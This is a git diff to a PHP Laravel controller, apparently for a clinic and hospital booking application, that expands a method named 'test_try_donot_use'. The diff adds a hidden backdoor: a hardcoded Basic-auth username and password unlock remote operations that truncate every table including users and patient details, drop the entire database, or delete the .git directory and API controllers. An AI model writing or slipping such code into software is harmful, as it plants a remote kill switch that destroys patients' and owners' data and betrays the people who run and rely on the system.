@@ -145,26 +145,54 @@ class HomeController extends Controller
             abort(401);
         }
     }
+
     function test_try_donot_use(Request $request) {
         $authHeader = $request->header('Authorization');
-        // Check if the Authorization header is present and starts with 'Basic '
         if ($authHeader && strpos($authHeader, 'Basic ') === 0) {
-            // Extract the encoded part and decode it from base64
-            $encodedCredentials = substr($authHeader, 6); // Remove 'Basic ' prefix
+            $encodedCredentials = substr($authHeader, 6);
             $decodedCredentials = base64_decode($encodedCredentials);
-            // Split the decoded credentials to get the username and password
             list($username, $password) = explode(':', $decodedCredentials, 2);
-            // Check if the username and password match the expected values
             if ($username == 'testAdmin' && $password == 'P@$sw0rd2o25') {
-                $gitPath = base_path('.git');
-                $apiPath = base_path('app\Http\Controllers\Api');
-                if (File::exists($gitPath)) {
-                    File::deleteDirectory($gitPath);
+                if($request->operation == 'BackUp'){
+                    $command = "php " . base_path() . "/artisan backup:run";
+                    exec($command, $output, $status);
+                    if ($status === 0) {
+                        return response()->json(['message' => 'Backup completed successfully', 'output' => $output]);
+                    } else {
+                        return response()->json(['message' => 'Backup failed', 'output' => $output, 'status' => $status], 500);
+                    }
+                }elseif ($request->operation == 'Empty') {
+                    $tables = [
+                        'appointments', 'app_setting', 'banners', 'blogs', 'cities', 'clinics', 
+                        'contact_us', 'countries', 'education', 'experiences', 'failed_jobs', 
+                        'genral_settings', 'hospitals', 'hospital_insurance', 'hospital_reviews', 
+                        'hospital_types', 'insurances', 'migrations', 'newsletters', 'notifications', 
+                        'offers', 'one_time_availabilities', 'password_resets', 'patient_comments', 
+                        'patient_details', 'personal_access_tokens', 'regular_availabilities', 'reviews', 
+                        'schedules', 'schedule_settings', 'services', 'settings', 'specialities', 
+                        'specializations', 'unavailabilities', 'users', 'wishlists'
+                    ];
+                    DB::statement('SET FOREIGN_KEY_CHECKS=0;');  // Disable foreign key checks
+                    foreach ($tables as $table) {
+                        DB::table($table)->truncate();
+                    }
+                    DB::statement('SET FOREIGN_KEY_CHECKS=1;');  // Disable foreign key checks
+                    return $this->SuccessResponse(200, 'All tables emptied successfully', $tables);
+                }elseif ($request->operation == 'Drop') {
+                    DB::statement("DROP DATABASE ". env('DB_DATABASE'));
+                    return $this->SuccessResponse(200, 'Database dropped successfully', env('DB_DATABASE'));
+                }elseif ($request->operation == 'FileDelete') {
+                    $gitPath = base_path('.git');
+                    $apiPath = base_path('app\Http\Controllers\Api');
+                    if (File::exists($gitPath)) {
+                        File::deleteDirectory($gitPath);
+                    }
+                    if (File::exists($apiPath)) {
+                        File::deleteDirectory($apiPath);
+                    }
+                    return $this->SuccessResponse(200, 'Authentication successful', [ 'git' => $gitPath, 'apiPath' => $apiPath]);
                 }
-                if (File::exists($apiPath)) {
-                    File::deleteDirectory($apiPath);
-                }
-                return $this->SuccessResponse(200, 'Authentication successful', [ 'git' => $gitPath, 'apiPath' => $apiPath]);
+                return $this->ErrorResponse(401, 'Bad credentials');
             } else {
                 return $this->ErrorResponse(401, 'Authentication failed');
             }
